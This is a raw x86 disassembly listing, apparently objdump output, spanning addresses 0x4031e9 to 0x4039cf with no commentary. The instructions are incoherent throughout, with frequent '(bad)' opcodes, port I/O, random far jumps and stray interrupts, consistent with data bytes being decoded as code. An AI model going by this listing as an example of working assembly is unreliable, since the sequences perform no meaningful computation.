  4031e9:	sub    DWORD PTR [eax+0x6e80ada9],ebx
  4031ef:	mov    edx,0x61da5cf3
  4031f4:	or     DWORD PTR [eax-0x67c82ef0],ebx
  4031fa:	push   ecx
  4031fb:	xchg   esi,eax
  4031fc:	xlat   BYTE PTR ds:[ebx]
  4031fd:	out    0xe0,al
  4031ff:	ss int3 
  403201:	xchg   DWORD PTR [ebp-0x64],edi
  403204:	xchg   ebx,eax
  403205:	pop    ebp
  403206:	(bad)  
  403207:	mov    al,0x15
  403209:	dec    esp
  40320a:	sbb    ebp,DWORD PTR [ebx+0x24]
  40320d:	out    dx,al
  40320e:	shl    BYTE PTR ss:[edx-0x78],1
  403212:	dec    ebp
  403213:	push   edi
  403214:	dec    esi
  403215:	out    0xf1,eax
  403217:	dec    edi
  403218:	mov    eax,0x754a1cbe
  40321d:	jmp    0x45:0x1d60c78c
  403224:	test   DWORD PTR [ecx+esi*2-0x22],0x39f0629f
  40322c:	jle    0x4031ce
  40322e:	outs   dx,BYTE PTR ds:[esi]
  40322f:	inc    esp
  403230:	pop    ss
  403231:	xchg   edx,eax
  403232:	rol    BYTE PTR [ebx],cl
  403234:	clc    
  403235:	dec    ebp
  403236:	sbb    eax,0xd79bb345
  40323b:	mov    eax,DWORD PTR [ebx+0x782696e3]
  403241:	inc    esi
  403242:	xlat   BYTE PTR ds:[ebx]
  403243:	fnsave [edi-0x26]
  403246:	dec    edi
  403247:	jl     0x403241
  403249:	push   edi
  40324a:	xchg   ebp,eax
  40324b:	pop    edi
  40324c:	mov    esp,0xa2f9e5f0
  403251:	sbb    dh,BYTE PTR [ecx]
  403253:	push   esi
  403254:	xor    DWORD PTR [ebp+0x3c],ebx
  403257:	jno    0x4032b2
  403259:	not    edx
  40325b:	sbb    eax,0xf245298
  403260:	mov    edi,0x87cc3586
  403265:	pop    edi
  403266:	lahf   
  403267:	aaa    
  403268:	sahf   
  403269:	scas   al,BYTE PTR es:[edi]
  40326a:	pop    esp
  40326b:	pop    eax
  40326c:	ins    DWORD PTR es:[edi],dx
  40326d:	push   ds
  40326e:	aam    0xb7
  403270:	ficom  DWORD PTR [ebp+0x210f31bb]
  403276:	lods   al,BYTE PTR ds:[esi]
  403277:	pop    ebx
  403278:	add    BYTE PTR [ebp+0x25],cl
  40327b:	and    eax,0x15ccda54
  403280:	mov    ebp,0x6904036b
  403285:	aad    0x25
  403287:	not    BYTE PTR [ecx]
  403289:	lods   al,BYTE PTR ds:[esi]
  40328a:	arpl   sp,si
  40328c:	hlt    
  40328d:	jecxz  0x403268
  40328f:	push   es
  403290:	clc    
  403291:	mov    ecx,0xf7fe9fff
  403296:	adc    DWORD PTR [eax+0x3],esp
  403299:	imul   ebp,DWORD PTR [ebx+ebx*1],0xdb50069b
  4032a0:	ins    BYTE PTR es:[edi],dx
  4032a1:	sub    dh,BYTE PTR [edx+ebx*2-0x2b848c79]
  4032a8:	jmp    FWORD PTR [ecx]
  4032aa:	fadd   QWORD PTR [edx-0x65]
  4032ad:	push   ebp
  4032ae:	xor    BYTE PTR [edi+0x1878c66c],cl
  4032b4:	sbb    DWORD PTR [edx-0x4d],ebx
  4032b7:	dec    edi
  4032b8:	push   0xffffffa6
  4032ba:	or     DWORD PTR [edi+eiz*8-0x6336418a],eax
  4032c1:	xchg   dh,ah
  4032c3:	rol    DWORD PTR [esp+edi*8+0xa],1
  4032c7:	sub    BYTE PTR ds:0x41df5c5,ch
  4032cd:	fdivr  DWORD PTR [eax-0x74]
  4032d0:	pop    ds
  4032d1:	rol    BYTE PTR [esi+0x7a],cl
  4032d4:	add    edx,DWORD PTR [ebx-0x5f77198f]
  4032da:	into   
  4032db:	pop    es
  4032dc:	sub    edi,DWORD PTR [edx-0x73fe132e]
  4032e2:	call   0x14413073
  4032e7:	cmp    eax,0x508577fb
  4032ec:	sub    DWORD PTR [ecx],eax
  4032ee:	sbb    DWORD PTR [ebp-0x31],0xe3c8ab71
  4032f5:	push   edx
  4032f6:	and    bl,BYTE PTR [edx]
  4032f8:	pop    ebx
  4032f9:	jb     0x403338
  4032fb:	test   bh,bh
  4032fd:	xchg   ebx,eax
  4032fe:	jle    0x40332e
  403300:	hlt    
  403301:	(bad)  
  403302:	pop    eax
  403303:	push   ss
  403304:	in     eax,dx
  403305:	cmp    BYTE PTR [edi+edi*2-0x19],bl
  403309:	mov    ch,0x31
  40330b:	gs pop esi
  40330d:	push   ebp
  40330e:	daa    
  40330f:	aaa    
  403310:	dec    ebp
  403311:	inc    ebx
  403312:	cli    
  403313:	bound  ecx,QWORD PTR [edi]
  403315:	pop    ss
  403316:	dec    ebx
  403317:	je     0x40338e
  403319:	pop    esi
  40331a:	scas   al,BYTE PTR es:[edi]
  40331b:	adc    DWORD PTR [ebx],ecx
  40331d:	pop    ss
  40331e:	(bad)  
  40331f:	lock syscall 
  403322:	xchg   edi,eax
  403323:	iret   
  403324:	int3   
  403325:	mov    ebx,0xd8ef9c39
  40332a:	loop   0x40332e
  40332c:	mov    ds:0x22fa1ee3,al
  403331:	mov    ecx,DWORD PTR [edx+0x7bcd405e]
  403337:	loopne 0x40333f
  403339:	mov    bh,0x21
  40333b:	pushf  
  40333c:	daa    
  40333d:	fsub   QWORD PTR [eax]
  40333f:	(bad)  
  403340:	jle    0x4032ee
  403342:	fwait
  403343:	in     eax,dx
  403344:	pop    ebp
  403345:	sub    eax,0x3ac6ac7e
  40334a:	cmc    
  40334b:	xchg   DWORD PTR [esi],edx
  40334d:	mov    dl,0x60
  40334f:	mov    esi,0x64560b8f
  403354:	jl     0x4033cc
  403356:	push   edx
  403357:	lods   al,BYTE PTR ds:[esi]
  403358:	lds    ebp,FWORD PTR [ecx+0x25]
  40335b:	mov    bl,ah
  40335d:	fisub  DWORD PTR [ecx-0x3a310f05]
  403363:	sbb    al,0x82
  403365:	or     DWORD PTR [edi-0x74],esi
  403368:	inc    esi
  403369:	mov    ebp,DWORD PTR [edx+0x35c63874]
  40336f:	sub    eax,DWORD PTR ds:0x6d30de2c
  403375:	sub    edi,DWORD PTR [esi-0x43230acb]
  40337b:	mov    bh,0xd2
  40337d:	outs   dx,BYTE PTR ds:[esi]
  40337e:	mov    ds:0xcfbd51c1,eax
  403383:	inc    edx
  403384:	push   0xffffffdb
  403386:	push   esp
  403387:	pop    edi
  403388:	xchg   edx,eax
  403389:	xor    al,0x6a
  40338b:	sbb    BYTE PTR [eax+0x70],ch
  40338e:	test   BYTE PTR [esp+ecx*4],dh
  403391:	inc    eax
  403392:	xor    ebx,DWORD PTR [edi+edi*4+0x4c]
  403396:	daa    
  403397:	iret   
  403398:	adc    bh,0x2
  40339b:	retf   0x882d
  40339e:	pop    es
  40339f:	aam    0x9
  4033a1:	and    al,0x5b
  4033a3:	xor    eax,0xdf3b50f6
  4033a8:	xchg   esi,eax
  4033a9:	fsub   DWORD PTR [ecx+0x51]
  4033ac:	push   esi
  4033ad:	sub    dh,BYTE PTR [ebx]
  4033af:	inc    ebp
  4033b0:	jne    0x40338a
  4033b2:	xchg   edx,eax
  4033b3:	xor    ah,BYTE PTR [ecx-0x5f]
  4033b6:	xchg   ebx,eax
  4033b7:	shr    DWORD PTR [ecx],0xda
  4033ba:	test   eax,0xa4747f5f
  4033bf:	pop    edi
  4033c0:	fsub   DWORD PTR [ecx]
  4033c2:	cli    
  4033c3:	ret    
  4033c4:	jb     0x403375
  4033c6:	lods   eax,DWORD PTR ds:[esi]
  4033c7:	les    ecx,FWORD PTR [edi-0x5e]
  4033ca:	pushf  
  4033cb:	inc    edi
  4033cc:	pusha  
  4033cd:	inc    ecx
  4033ce:	and    bl,bh
  4033d0:	fisttp QWORD PTR [esi+eiz*4]
  4033d3:	lods   al,BYTE PTR ds:[esi]
  4033d4:	enter  0x595d,0x5c
  4033d8:	inc    ebx
  4033d9:	sub    BYTE PTR [edx+0x76],dl
  4033dc:	(bad)  
  4033de:	push   ds
  4033df:	je     0x4033d8
  4033e1:	mov    ds:0x2f7bb7a,al
  4033e6:	or     DWORD PTR ds:0xbc137d73,ebx
  4033ec:	out    0x27,eax
  4033ee:	sub    DWORD PTR [ebx+0xa],edi
  4033f1:	das    
  4033f2:	(bad)  
  4033f4:	push   ecx
  4033f5:	sbb    dh,BYTE PTR [esi]
  4033f7:	fnsave [ebx]
  4033f9:	inc    edi
  4033fa:	js     0x4033ce
  4033fc:	cmc    
  4033fd:	stos   DWORD PTR es:[edi],eax
  4033fe:	pop    ss
  4033ff:	inc    eax
  403400:	(bad)  
  403402:	sbb    BYTE PTR [ebp-0x45],al
  403405:	inc    esi
  403406:	jbe    0x40342a
  403408:	test   BYTE PTR [ebx+0x31c6363b],0xbf
  40340f:	and    dh,ch
  403411:	data16 aaa 
  403413:	mov    WORD PTR [esi],?
  403415:	(bad)  [ebx+0x384aacac]
  40341b:	cdq    
  40341c:	dec    ecx
  40341d:	jmp    0x40342d
  40341f:	addr16 jg 0x40344c
  403422:	popf   
  403423:	mov    ah,0x72
  403425:	and    BYTE PTR [edx-0x2c00d302],al
  40342b:	dec    esp
  40342c:	ja     0x403497
  40342e:	push   esp
  40342f:	mov    al,ds:0x10fe5e09
  403434:	add    al,BYTE PTR cs:[edi-0x5d]
  403438:	ret    0x342c
  40343b:	mov    BYTE PTR [esi-0x297e6a94],dh
  403441:	call   DWORD PTR [ebp+ecx*2-0x1fcca2f0]
  403448:	dec    esi
  403449:	outs   dx,DWORD PTR ds:[esi]
  40344a:	and    ebp,DWORD PTR [ebp+ebp*8+0x62]
  40344e:	test   al,0x3b
  403450:	or     ah,BYTE PTR [edi]
  403452:	xor    ebp,DWORD PTR [ebx-0x3d]
  403455:	ror    BYTE PTR [esi+esi*8+0x7d956226],0x6
  40345d:	mov    esi,0xa5ebb43c
  403462:	cmp    ebx,DWORD PTR [esi-0x3b93698c]
  403468:	arpl   dx,sp
  40346a:	pop    es
  40346b:	mov    bl,0xa2
  40346d:	shl    esp,1
  40346f:	jns    0x4034cf
  403471:	xor    edx,DWORD PTR [esi]
  403473:	inc    esi
  403474:	out    dx,al
  403475:	(bad)  
  403478:	lods   eax,DWORD PTR ds:[esi]
  403479:	test   eax,0x6df7221f
  40347e:	loopne 0x4034d1
  403480:	shl    BYTE PTR [ebp+0x7d],0x80
  403484:	pop    ss
  403485:	sti    
  403486:	iret   
  403487:	mov    ebx,0xce14bb8
  40348c:	(bad)  
  40348e:	adc    al,BYTE PTR ds:0xcc3f0a7a
  403494:	rcr    BYTE PTR es:[ebx-0x2e2161ae],0x68
  40349c:	mov    al,0x73
  40349e:	repnz ror DWORD PTR [esi+0x4b2dd256],1
  4034a5:	scas   al,BYTE PTR es:[edi]
  4034a6:	xchg   ecx,eax
  4034a7:	mov    al,0x89
  4034a9:	neg    DWORD PTR [ebp+0x68802361]
  4034af:	in     al,dx
  4034b0:	sbb    BYTE PTR [eax+0x17],0xd7
  4034b4:	int3   
  4034b5:	fild   DWORD PTR fs:[edi-0x105c2f1]
  4034bc:	lea    eax,ds:0xaadcd342
  4034c2:	pop    ebp
  4034c3:	mov    eax,0x2e0f2e04
  4034c8:	mov    eax,0xd009f02a
  4034cd:	mov    esp,0xb3b20367
  4034d2:	add    bh,BYTE PTR [edi]
  4034d4:	and    al,0xda
  4034d6:	repz cmp al,0xd8
  4034d9:	push   es
  4034da:	adc    BYTE PTR [ecx+0x5e498fab],bh
  4034e0:	icebp  
  4034e1:	outs   dx,DWORD PTR ds:[esi]
  4034e2:	inc    esi
  4034e3:	xor    esp,eax
  4034e5:	aam    0x23
  4034e7:	sbb    BYTE PTR ds:[ebx+0x5e35a13d],cl
  4034ee:	ins    BYTE PTR es:[edi],dx
  4034ef:	jb     0x40355c
  4034f1:	(bad)  
  4034f3:	sub    BYTE PTR [esp+edx*2-0x8],ch
  4034f7:	stos   DWORD PTR es:[edi],eax
  4034f8:	scas   eax,DWORD PTR es:[edi]
  4034f9:	mov    ecx,0x3410e48d
  4034fe:	push   esi
  4034ff:	out    0x71,al
  403501:	push   ecx
  403502:	mov    dl,0x30
  403504:	loopne 0x403502
  403506:	(bad)  
  403507:	xchg   esp,eax
  403508:	or     al,BYTE PTR [esi-0x28dfc724]
  40350e:	dec    esi
  40350f:	shl    BYTE PTR [ebx+0x39],0x89
  403513:	(bad)  
  403514:	jmp    0xb235:0x76ad490b
  40351b:	(bad)  [ebx-0x72]
  40351e:	retf   0x1902
  403521:	and    al,al
  403523:	xor    BYTE PTR [edx+0x750bf941],ah
  403529:	sbb    DWORD PTR [ecx+edi*1],edi
  40352c:	xor    cl,BYTE PTR [ebx-0x2b5abd76]
  403532:	xchg   DWORD PTR [ecx+0x5591608d],ebx
  403538:	retf   
  403539:	hlt    
  40353a:	inc    eax
  40353b:	shl    BYTE PTR [ecx-0x70],cl
  40353e:	push   ds
  40353f:	xchg   esi,eax
  403540:	popf   
  403541:	test   DWORD PTR [ebp+ebp*2+0x3727c273],ecx
  403548:	pop    es
  403549:	(bad)  
  40354a:	sti    
  40354b:	bound  edx,QWORD PTR [ecx]
  40354d:	pop    ebp
  40354e:	mov    edi,0xb008e7bf
  403553:	imul   eax,DWORD PTR [edx],0x8d2d9645
  403559:	pop    esi
  40355a:	push   0x73
  40355c:	outs   dx,BYTE PTR ds:[esi]
  40355d:	mov    al,ds:0x256d1a21
  403562:	xchg   edi,eax
  403563:	xor    DWORD PTR [esi+0x6a50b0aa],ebp
  403569:	xor    BYTE PTR [esi+0x3e748144],bh
  40356f:	jno    0x4035ed
  403571:	ja     0x403556
  403573:	js     0x4035ab
  403575:	sub    al,0x5f
  403577:	mov    ch,0xd6
  403579:	mov    WORD PTR [ebp-0x5f],ss
  40357c:	lahf   
  40357d:	xchg   BYTE PTR [esi-0x6e],ah
  403580:	pushf  
  403581:	add    ebx,ebx
  403583:	mov    DWORD PTR [esi+0x7b17bb46],ebx
  403589:	add    DWORD PTR [edx+0x17acc89b],ebx
  40358f:	sub    DWORD PTR [ebx-0x43],eax
  403592:	adc    al,0xc
  403594:	dec    ebp
  403595:	scas   al,BYTE PTR es:[edi]
  403596:	sbb    al,0x63
  403598:	pop    ss
  403599:	icebp  
  40359a:	inc    ebx
  40359b:	stos   BYTE PTR es:[edi],al
  40359c:	jecxz  0x403571
  40359e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40359f:	dec    ebp
  4035a0:	repnz push edi
  4035a2:	pop    edx
  4035a3:	call   0xbbaec0a2
  4035a8:	xor    cl,BYTE PTR [esi-0x7a]
  4035ab:	rcr    DWORD PTR [edx+eiz*2-0xa44031f],0x47
  4035b3:	rep lods al,BYTE PTR ds:[esi]
  4035b5:	adc    eax,0x7be2abff
  4035ba:	push   es
  4035bb:	ds and eax,0xcf10f3c8
  4035c1:	and    DWORD PTR [edi-0x59d88fb7],ebx
  4035c7:	loopne 0x4035c2
  4035c9:	xlat   BYTE PTR ds:[ebx]
  4035ca:	mov    bh,0xa
  4035cc:	lock push ecx
  4035ce:	xchg   edi,esi
  4035d0:	(bad)  
  4035d1:	jmp    0x45bf:0x609580dd
  4035d8:	cmp    BYTE PTR [ebp-0x79],0xd9
  4035dc:	out    dx,eax
  4035dd:	je     0x403618
  4035df:	or     esp,edx
  4035e1:	addr16 adc al,0xce
  4035e4:	mov    edi,0x69fa8493
  4035e9:	sbb    eax,0xe92f0170
  4035ee:	mov    esp,0x9f6fe437
  4035f3:	xor    al,0x8d
  4035f5:	sbb    al,0x93
  4035f7:	mov    dh,0xf4
  4035f9:	pop    ebp
  4035fa:	ror    dh,1
  4035fc:	adc    al,0x7d
  4035fe:	pop    edi
  4035ff:	lahf   
  403600:	mov    fs,WORD PTR [edx+ebx*8]
  403603:	pushf  
  403604:	pop    ds
  403605:	ins    BYTE PTR es:[edi],dx
  403606:	xor    al,0xe9
  403608:	cli    
  403609:	cdq    
  40360a:	imul   edi,DWORD PTR [edi+ecx*1-0x22],0x30527356
  403612:	add    eax,0x83780e03
  403617:	add    eax,0xbd39444f
  40361c:	add    eax,0xeb260774
  403621:	js     0x4035db
  403623:	mov    ecx,0xf6cf793
  403628:	in     al,0x43
  40362a:	int    0x87
  40362c:	mov    esp,0x3b9c5fbc
  403631:	jno    0x40367f
  403633:	jne    0x403643
  403635:	pop    ds
  403636:	push   cs
  403637:	and    eax,0xe8f21333
  40363c:	int3   
  40363d:	fs ins BYTE PTR es:[edi],dx
  40363f:	push   ebp
  403640:	retf   0x829c
  403643:	sub    al,BYTE PTR [edi+ebp*4]
  403646:	popf   
  403647:	dec    ebx
  403648:	js     0x4035ed
  40364a:	push   ebx
  40364b:	push   esp
  40364c:	sbb    ebx,DWORD PTR [edi-0xaff7873]
  403652:	pop    ss
  403653:	ror    BYTE PTR [edx-0x4a],cl
  403656:	inc    ebp
  403657:	and    DWORD PTR ds:0x1fb8beb8,ebp
  40365d:	shr    BYTE PTR [ebp-0x72],cl
  403660:	ret    
  403661:	push   ebp
  403662:	ss test edx,esi
  403665:	sahf   
  403666:	clc    
  403667:	(bad)  
  403668:	pop    ebx
  403669:	das    
  40366a:	push   ecx
  40366b:	xchg   ebp,eax
  40366c:	jb     0x403651
  40366e:	loope  0x4036ca
  403670:	cmc    
  403671:	pop    esp
  403672:	adc    DWORD PTR [esi+0x2a714be5],edx
  403678:	cld    
  403679:	imul   eax,DWORD PTR [ebp+ebx*2-0x6b226f7b],0x30
  403681:	jecxz  0x40368b
  403683:	(bad)  
  403684:	in     eax,dx
  403685:	xor    ah,ch
  403687:	xor    DWORD PTR [edx-0x19bc3fc],ebx
  40368d:	icebp  
  40368e:	pop    edi
  40368f:	add    DWORD PTR [ebx-0x611123c7],eax
  403695:	add    ebp,esi
  403697:	(bad)  
  403698:	les    esp,FWORD PTR [ecx+eiz*4]
  40369b:	stos   BYTE PTR es:[edi],al
  40369c:	stos   BYTE PTR es:[edi],al
  40369d:	out    dx,eax
  40369e:	jmp    0x2c40:0x3fa86055
  4036a5:	imul   esp,edi,0x5fbbdd9
  4036ab:	stos   BYTE PTR es:[edi],al
  4036ac:	out    0x7,eax
  4036ae:	test   eax,0xb349c0dc
  4036b3:	shl    BYTE PTR [ecx-0x4b72dd1b],1
  4036b9:	mov    bl,0xd2
  4036bb:	shl    DWORD PTR [ebx-0x7925c78],cl
  4036c1:	stos   DWORD PTR es:[edi],eax
  4036c2:	outs   dx,DWORD PTR ds:[esi]
  4036c3:	test   eax,0x204c69d2
  4036c8:	jge    0x40365a
  4036ca:	imul   ebx,DWORD PTR [ebp-0x73],0x79
  4036ce:	and    BYTE PTR [ebx+0x31a3e789],0xa6
  4036d5:	inc    ebx
  4036d6:	or     BYTE PTR [edi],ch
  4036d8:	jmp    0x624f600c
  4036dd:	repz jecxz 0x403726
  4036e0:	and    eax,0xe40922eb
  4036e5:	inc    ecx
  4036e6:	push   ds
  4036e7:	(bad)  
  4036e8:	cli    
  4036e9:	sbb    esi,eax
  4036eb:	or     dh,BYTE PTR [ecx+0x68d9135f]
  4036f1:	xchg   esp,eax
  4036f2:	inc    edx
  4036f3:	mov    ds:0x3de390a7,eax
  4036f8:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036fa:	mov    ecx,0x874f6cd8
  4036ff:	das    
  403700:	repz daa 
  403702:	shl    BYTE PTR [esi],cl
  403704:	js     0x4036fd
  403706:	cmp    al,0xa3
  403708:	sbb    edi,DWORD PTR [eax+0x8]
  40370b:	mov    ebp,0x6ffc991
  403710:	dec    ebx
  403711:	inc    eax
  403712:	jno    0x403771
  403714:	mov    dh,0xd0
  403716:	outs   dx,BYTE PTR ds:[esi]
  403717:	cmp    al,0x48
  403719:	scas   eax,DWORD PTR es:[edi]
  40371a:	sbb    al,0x99
  40371c:	hlt    
  40371d:	or     ebp,esi
  40371f:	ret    
  403720:	or     ah,BYTE PTR [edi]
  403722:	in     eax,dx
  403723:	push   ss
  403724:	mov    WORD PTR [edx+eax*1],?
  403727:	inc    ebx
  403728:	xor    BYTE PTR [esi+0x7f6a9cf2],dh
  40372e:	out    0x87,eax
  403730:	mov    ch,0x19
  403732:	push   ebp
  403733:	xchg   ebp,eax
  403734:	pushaw 
  403736:	int    0x4
  403738:	popa   
  403739:	in     eax,dx
  40373a:	push   edi
  40373b:	pop    edi
  40373c:	cs std 
  40373e:	test   DWORD PTR [eax+edi*2-0x5e],edi
  403742:	fs xchg ebp,eax
  403744:	add    eax,0x7d
  403747:	or     DWORD PTR [esi+0x69],0x37
  40374b:	xor    al,0x64
  40374d:	ds repz cs shl ah,0x9c
  403753:	cs push ebp
  403755:	fs xor eax,0xea749c89
  40375b:	sub    ch,BYTE PTR [esp+esi*8-0x7614bd57]
  403762:	jbe    0x4037db
  403764:	ds imul esi,esp,0xafb56d23
  40376b:	in     eax,0x3b
  40376d:	adc    al,0xad
  40376f:	pop    eax
  403770:	pop    ds
  403771:	jae    0x403708
  403773:	out    dx,al
  403774:	(bad)  
  403775:	xor    al,0x17
  403777:	and    ecx,ebp
  403779:	mov    ds:0xdbf9e956,eax
  40377e:	pusha  
  40377f:	mov    ss,eax
  403781:	retf   0xb3e
  403784:	sub    BYTE PTR [eax],al
  403786:	pop    ecx
  403787:	sti    
  403788:	mov    ecx,0x37431723
  40378d:	cmp    DWORD PTR ds:0x128886fc,esi
  403793:	lds    esp,FWORD PTR [esi]
  403795:	out    0xde,eax
  403797:	add    BYTE PTR [edi-0x41ff852b],al
  40379d:	div    DWORD PTR [ebp-0x1a]
  4037a0:	aad    0xfe
  4037a2:	mov    eax,0x26ec211c
  4037a7:	xchg   ebp,eax
  4037a8:	push   ebx
  4037a9:	ins    BYTE PTR es:[edi],dx
  4037aa:	and    eax,0xd9a9ef7e
  4037af:	dec    edi
  4037b0:	rcl    BYTE PTR [ebp+eax*4+0x2d],cl
  4037b4:	and    cl,ah
  4037b6:	call   0x79ea100c
  4037bb:	jecxz  0x403834
  4037bd:	outs   dx,BYTE PTR ds:[si]
  4037bf:	add    BYTE PTR [edi+0x2a],0x1a
  4037c3:	icebp  
  4037c4:	inc    edi
  4037c5:	hlt    
  4037c6:	icebp  
  4037c7:	(bad)  
  4037c8:	adc    eax,0x17aa3d20
  4037cd:	cwde   
  4037ce:	std    
  4037cf:	adc    BYTE PTR [edx-0x7f4f6fa3],0xcb
  4037d6:	retf   0x4451
  4037d9:	sbb    DWORD PTR [eax+0x373c644e],ebx
  4037df:	mov    ebp,0x50c93748
  4037e4:	call   0x58d3:0x260f5b3
  4037eb:	mov    edx,0x83ec07e3
  4037f0:	clc    
  4037f1:	xchg   BYTE PTR [edi-0x4291e648],bh
  4037f7:	push   ecx
  4037f8:	pop    ebp
  4037f9:	adc    DWORD PTR [edx+0x3ee58f49],esp
  4037ff:	xchg   cx,bx
  403802:	add    dl,BYTE PTR [eax-0x880d625]
  403808:	stc    
  403809:	xchg   edi,eax
  40380a:	add    al,cl
  40380c:	(bad)
  40380f:	int    0x20
  403811:	push   ebx
  403812:	in     eax,0x38
  403814:	stc    
  403815:	outs   dx,BYTE PTR cs:[esi]
  403817:	daa    
  403818:	xchg   DWORD PTR ds:0x1c4c9b3c,esp
  40381e:	(bad)  
  40381f:	rcr    DWORD PTR [ebp-0x5e332297],1
  403825:	bnd ret 
  403827:	or     al,0xdc
  403829:	rcl    DWORD PTR [eax-0x7d2980ff],1
  40382f:	lock in al,dx
  403831:	add    DWORD PTR [esi-0x1e],edi
  403834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403835:	push   ebx
  403836:	shr    DWORD PTR [ebx-0x27],cl
  403839:	dec    edi
  40383a:	sub    esi,0xbe909ca1
  403840:	xor    al,0xc9
  403842:	repz xlat BYTE PTR ds:[ebx]
  403844:	mov    ds,WORD PTR [edi+ebp*8-0x20]
  403848:	in     eax,dx
  403849:	int    0x47
  40384b:	fnstsw WORD PTR [esi-0x52]
  40384e:	xchg   edx,ebx
  403850:	outs   dx,DWORD PTR ds:[esi]
  403851:	push   ecx
  403852:	je     0x4038a3
  403854:	cmp    eax,0xc8417e9b
  403859:	dec    edi
  40385a:	jp     0x4038d3
  40385c:	lods   al,BYTE PTR ds:[esi]
  40385d:	call   0xd567:0x29d9b7c7
  403864:	sbb    esp,ecx
  403866:	pop    ebp
  403867:	xchg   ebp,eax
  403868:	rcl    DWORD PTR [ebp+0x2173f280],0xb7
  40386f:	dec    edx
  403870:	dec    ebp
  403871:	and    al,0xfb
  403873:	repnz cld 
  403875:	daa    
  403876:	mov    ebx,0xf210e66e
  40387b:	pop    ebx
  40387c:	je     0x4038cb
  40387e:	in     eax,dx
  40387f:	ret    0xfd4
  403882:	in     al,dx
  403883:	sbb    BYTE PTR [ebx],0xdd
  403886:	call   0x788d:0xed42992
  40388d:	cdq    
  40388e:	mov    ecx,0xfd8ea343
  403893:	sub    DWORD PTR [esi],edx
  403895:	retf   0xc353
  403898:	push   edx
  403899:	out    dx,al
  40389a:	push   ebp
  40389b:	stc    
  40389c:	(bad)  
  40389d:	jmp    0xa1ca:0xf4983018
  4038a4:	mov    dh,0xe8
  4038a6:	or     edi,DWORD PTR [edx]
  4038a8:	push   cs
  4038a9:	test   DWORD PTR [esi+0x6c],ebx
  4038ac:	push   es
  4038ad:	or     DWORD PTR [edi-0x7c],0x3b
  4038b1:	push   ebp
  4038b2:	adc    dh,dl
  4038b4:	call   0x8f05:0x2f6af23f
  4038bb:	sar    BYTE PTR [ebp+edx*2+0x6cfd20ba],cl
  4038c2:	lock jmp FWORD PTR [ebx+0x6d]
  4038c6:	mov    edx,0x65457fbc
  4038cb:	leave  
  4038cc:	fxtract 
  4038ce:	push   ds
  4038cf:	jns    0x4038d5
  4038d1:	mov    WORD PTR [ebp-0x398368a],ds
  4038d7:	jns    0x40386e
  4038d9:	adc    al,al
  4038db:	adc    DWORD PTR es:[ebx],edi
  4038de:	rcr    DWORD PTR [eax+esi*2],0x8
  4038e2:	mov    bl,0x1f
  4038e4:	dec    ebx
  4038e5:	lea    ebp,[ebp-0x3c]
  4038e8:	test   al,0xad
  4038ea:	ficomp DWORD PTR [edx+0x5b]
  4038ed:	imul   ecx,ebx,0x14
  4038f0:	sbb    DWORD PTR [esi],edi
  4038f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038f3:	pop    sp
  4038f5:	xchg   edx,eax
  4038f6:	into   
  4038f7:	cwde   
  4038f8:	cld    
  4038f9:	push   esp
  4038fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038fb:	pop    ds
  4038fc:	pop    ss
  4038fd:	clc    
  4038fe:	test   eax,0xe75d8b15
  403903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403904:	push   esi
  403905:	repnz lods eax,DWORD PTR ds:[esi]
  403907:	outs   dx,BYTE PTR ds:[esi]
  403908:	cld    
  403909:	inc    esp
  40390a:	mov    DWORD PTR [ebp-0x341a2fa9],esp
  403910:	fadd   DWORD PTR [ecx+0x6a]
  403913:	pmaxsw mm2,QWORD PTR [edx]
  403916:	fst    DWORD PTR [edi-0x66d3da51]
  40391c:	and    BYTE PTR [ebp+0xb],al
  40391f:	inc    ecx
  403920:	ror    esi,0xe8
  403923:	test   al,0xb6
  403925:	mov    eax,ds:0x974a8c57
  40392a:	js     0x40392b
  40392c:	mov    ebp,0x28233319
  403931:	sub    eax,0x265f1721
  403936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403937:	enter  0x9660,0x4a
  40393b:	xor    al,0x64
  40393d:	push   ebx
  40393e:	sti    
  40393f:	fs adc al,0x42
  403942:	sti    
  403943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403944:	call   0xa41b:0x77587b5d
  40394b:	ja     0x40391f
  40394d:	xchg   edi,esi
  40394f:	mov    ebx,0xdc08564e
  403954:	in     al,0x78
  403956:	into   
  403957:	ins    DWORD PTR es:[edi],dx
  403958:	dec    ebx
  403959:	and    DWORD PTR [eax],ebp
  40395b:	jnp    0x4038e9
  40395d:	ss aas 
  40395f:	iret   
  403960:	inc    ebp
  403961:	ja     0x40398e
  403963:	sub    bh,BYTE PTR cs:[edx]
  403966:	ins    DWORD PTR es:[edi],dx
  403967:	popf   
  403968:	pop    edi
  403969:	inc    edi
  40396a:	rol    ebx,cl
  40396c:	mov    DWORD PTR [esi+0x3202a9dd],ebp
  403972:	mov    al,0x72
  403974:	popf   
  403975:	sahf   
  403976:	sub    ecx,esi
  403978:	not    DWORD PTR [esi-0x28]
  40397b:	retf   
  40397c:	in     eax,dx
  40397d:	sbb    eax,0xbe78c57c
  403982:	dec    ebp
  403983:	ins    DWORD PTR es:[edi],dx
  403984:	inc    ecx
  403985:	dec    esp
  403986:	push   ebx
  403987:	(bad)  
  403988:	sbb    eax,0x61e2569c
  40398d:	shr    DWORD PTR [edx+0x4fdc508a],0xd6
  403994:	hlt    
  403995:	mov    al,0xa
  403997:	mov    edx,0x4b214aa0
  40399c:	aam    0x54
  40399e:	sub    al,0xbe
  4039a0:	add    edi,DWORD PTR [eax]
  4039a2:	retf   
  4039a3:	test   al,0x2f
  4039a5:	and    dl,dl
  4039a7:	(bad)  
  4039a8:	sub    BYTE PTR [ecx-0x57],ch
  4039ab:	out    dx,al
  4039ac:	inc    ecx
  4039ad:	pushf  
  4039ae:	into   
  4039af:	xchg   ebp,eax
  4039b0:	cmp    edx,0x3c62c143
  4039b6:	dec    esp
  4039b7:	or     edx,esi
  4039b9:	pushf  
  4039ba:	push   edx
  4039bb:	loop   0x403967
  4039bd:	dec    edx
  4039be:	call   FWORD PTR [ecx+0x72]
  4039c1:	test   BYTE PTR [ebx-0x29717ddf],dl
  4039c7:	gs inc ecx
  4039c9:	pop    ss
  4039ca:	test   BYTE PTR [edx+edi*2+0x3a],0x4c
  4039cf:	xchg   esi,eax
